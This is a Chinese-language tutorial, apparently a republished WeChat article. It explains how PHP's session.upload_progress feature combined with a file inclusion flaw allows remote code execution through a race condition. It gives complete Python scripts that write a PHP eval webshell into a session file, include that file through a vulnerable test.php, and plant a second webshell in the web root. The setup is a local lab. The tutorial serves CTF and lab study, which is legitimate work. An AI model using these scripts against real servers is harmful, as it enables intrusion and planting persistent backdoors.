<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/TCxEBTnirr4hu5L33sp6Bg)

**什么是 session.upload_progress？**
--------------------------------

与`open_basedir`、`allow_url_fopen`、`allow_url_include`等 PHP 配置一样，`session.upload_progress`也是 PHP 的一个功能，同样可以在`php.ini`中设置相关属性。其中最重要的几个设置如下：

```
session.upload_progress.enabled = on
session.upload_progress.cleanup = on
session.upload_progress.prefix = "upload_progress_"
session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"
```

*   session.upload_progress.enabled 可以控制是否开启 session.upload_progress 功能
    
*   session.upload_progress.cleanup 可以控制是否在上传之后删除文件内容
    
*   session.upload_progress.prefix 可以设置上传文件内容的前缀
    
*   session.upload_progress.name 的值即为 session 中的键值
    

**session.upload_progress 开启之后会有什么效果？**
---------------------------------------

当我们将`session.upload_progress.enabled`的值设置为 **on** 时，此时我们再往服务器中上传一个文件时，PHP 会把该文件的详细信息 (如上传时间、上传进度等) 存储在 session 当中。

**问题 1：**

那么这个时候就会有一个前提条件，就是如何初始化 session 并且把 session 中的内容写到文件中去呢？

**分析 1：**

我们可以注意到，php.ini 中`session.use_strict_mode`选项默认是 0，在这个情况下，用户可以自己定义自己的 sessionid，例如当用户在 cookie 中设置`sessionid=Lxxx`时，PHP 就会生成一个文件`/tmp/sess_Lxxx`，此时也就初始化了 session，并且会将上传的文件信息写入到文件`/tmp/sess_Lxxx`中去，具体文件的内容是什么，后面会写到。

**问题 2：**

当 session.upload_progress.cleanup 的值为 on 时，即使上传文件，但是上传完成之后文件内容会被清空，这怎么办？

**分析 2：**

利用 Python 的多线程，进行**条件竞争**。

**如何利用 session.upload_progress 进行 RCE？**
----------------------------------------

然而，理论再多也没用，还是得一步步调试，看看在文件上传的时候，整一个 PHP 服务端到底发生了什么。所以还是需要做实验。

首先，在网站根目录下随便新建一个 **test.php** 文件

然后写一个 Python 程序用于往服务器上上传文件：

这里有几个注意点：

*   上传的文件大小为 50KB，文件名为 Lxxx.jpg
    
*   该程序设置的 sessionid 为 Lxxx，也就是说会在`/tmp`目录下生成`sess_Lxxx`文件
    
*   该程序设置的`PHP_SESSION_UPLOAD_PROGRESS`值为一句话木马，也就是说，在理论上，一句话木马会被写入到`/tmp/sess_Lxxx`中
    

```
import requests
import io
url = "http://192.168.2.128/test.php"
sessid = "Lxxx"

def write(session):
   filebytes = io.BytesIO(b'a' * 1024 * 50)
   while True:
       res = session.post(url,
           data={
               'PHP_SESSION_UPLOAD_PROGRESS': "<?php eval($_POST[1]);?>"
              },
           cookies={
               'PHPSESSID': sessid
              },
           files={
               'file': ('Lxxx.jpg', filebytes)
              }
          )

if __name__ == "__main__":
   with requests.session() as session:
       write(session)
```

执行程序后，我们需要用`tail -f`命令实时查看`/tmp/sess_Lxxx`文件，因为在本地测试速度比较快，如果使用 cat 命令，文件内容还没输出就被删除了。

```
tail -f /tmp/sess_Lxxx
```

结果如下：  

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdPk35IQENhBsmoPo4ZgNMmqNic0iaxUws9oeOricwmvTugVSKtHy9cHUiaRBr9YZmSdMMaaOZ6RWWJtQ/640?wx_fmt=png)

也就是说，`/tmp/sess_Lxxx`文件中的内容为：

```
upload_progress_<?php eval($_POST[1]);?>|a:5:{s:10:"start_time";i:1631343214;s:14:"content_length";i:276;s:15:"bytes_processed";i:276;s:4:"done";b:0;s:5:"files";a:1:{i:0;a:7:{s:10:"field_name";s:4:"file";s:4:"name";s:8:"Lxxx.jpg";s:8:"tmp_name";N;s:5:"error";i:0;s:4:"done";b:0;s:10:"start_time";i:1631343214;s:15:"bytes_processed";i:276;\}\\}\}
```

仔细分析一下该文件内容，该文件分为两块，以竖线`|`区分。

**第一块内容如下：**

```
upload_progress_<?php eval($_POST[1]);?>
```

这一块内容由以下两个值组成：`session.upload_progress.name`+`PHP_SESSION_UPLOAD_PROGRESS`

**第二块内容如下：**

```
a:5:{s:10:"start_time";i:1631343214;s:14:"content_length";i:276;s:15:"bytes_processed";i:276;s:4:"done";b:0;s:5:"files";a:1:{i:0;a:7:{s:10:"field_name";s:4:"file";s:4:"name";s:8:"Lxxx.jpg";s:8:"tmp_name";N;s:5:"error";i:0;s:4:"done";b:0;s:10:"start_time";i:1631343214;s:15:"bytes_processed";i:276;\}\\}\}
```

一看就是序列化之后的值，我们将其进行反序列化后输出：

```
array(5) {
["start_time"]=>
 int(1631343214)
["content_length"]=>
 int(276)
["bytes_processed"]=>
 int(276)
["done"]=>
 bool(false)
["files"]=>
 array(1) {
  [0]=>
   array(7) {
    ["field_name"]=>
     string(4) "file"
    ["name"]=>
     string(8) "Lxxx.jpg"
    ["tmp_name"]=>
     NULL
    ["error"]=>
     int(0)
    ["done"]=>
     bool(false)
    ["start_time"]=>
     int(1631343214)
    ["bytes_processed"]=>
     int(276)
  }
}
}
```

可以看到这里记录了文件上传时间、文件大小、文件名称等等文件属性。

接下来在网站根目录新建一个 **test.php** 文件，文件内容如下：

```
<?php
$a = $_GET["a"];
include($a);
```

很明显有一个文件包含的漏洞。

接下来我们利用`session.upload_progress`进行**条件竞争**

以下代码有几个注意点：

*   首先，函数 write 和上面的是一样的，这里就不做过多的赘述了
    
*   整个代码的思路就是，往`/tmp/sess_Lxxx`文件中写入一句话木马，密码为 1，然后用题目中的文件包含漏洞，包含这一个文件，在函数 read 中尝试利用`/tmp/sess_Lxxx`的一句话往网站根目录文件`1.php`写一句话木马，密码为 2
    
*   利用 Python 的多线程，一边上传文件，一边尝试往根目录中写入`1.php`，如果成功写入了，就打印输出 **“成功写入一句话”**
    
*   这里利用 Python 的 threading 模块，开 5 个线程进行条件竞争
    

代码如下：

```
import requests
import io
import threading

url = "http://192.168.2.128/test.php"
sessid = "Lxxx"

def write(session):
   filebytes = io.BytesIO(b'a' * 1024 * 50)
   while True:
       res = session.post(url,
           data={
               'PHP_SESSION_UPLOAD_PROGRESS': "<?php eval($_POST[1]);?>"
              },
           cookies={
               'PHPSESSID': sessid
              },
           files={
               'file': ('Lxxx.jpg', filebytes)
              }
          )

def read(session):
   while True:
       res = session.post(url+"?a=/tmp/sess_"+sessid,
                          data={
                              "1":"file_put_contents('/www/admin/localhost_80/wwwroot/1.php' , '<?php eval($_POST[2]);?>');"
                          },
                          cookies={
                              "PHPSESSID":sessid
                          }
                          )
       res2 = session.get("http://192.168.2.128/1.php")
       if res2.status_code == 200:
           print("成功写入一句话！")
       else:
           print("Retry")



if __name__ == "__main__":
   evnet = threading.Event()
   with requests.session() as session:
       for i in range(5):
           threading.Thread(target=write, args=(session,)).start()
       for i in range(5):
           threading.Thread(target=read, args=(session,)).start()
   evnet.set()
```

代码执行结果如下：  

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdPk35IQENhBsmoPo4ZgNMmDqtyMC6vRGdyDt08N4OY7P03J3sMYVDf13MggZXwwckhp7XQelDg5g/640?wx_fmt=png)

一开始会一直显示 Retry，但是只要运行一段时间就会成功写入一句话。  

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdPk35IQENhBsmoPo4ZgNMmiaiaM7ANHeu4tiaPXibGl2BNtYXyX1SibPFQPGBq244jZBtFnfz5rd9Ciarg/640?wx_fmt=png)

可以在网站根目录看到，成功写入一句话。

**参考资料**
--------

*   Nu1L 战队的书籍《从 0 到 1 CTFer 成长之路》 P140-141
    
*   https://www.freebuf.com/vuls/202819.html
    

**实操推荐：php 竞争条件漏洞**

PC 端实操地址：http://mrw.so/5JFZS1  

“竞争条件” 发生在多个线程同时访问同一个共享代码、变量、文件等没有进行锁操作或者同步操作的场景中。  

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC6iavic0tIJIoZCwKvUYnFFiaibvE8yamPS1RojR1NmfucyIyYeOvaY7CcN5WW1hVg11mZCuwayLtnnBQ/640?wx_fmt=gif)

戳 “阅读原文” 体验免费靶场！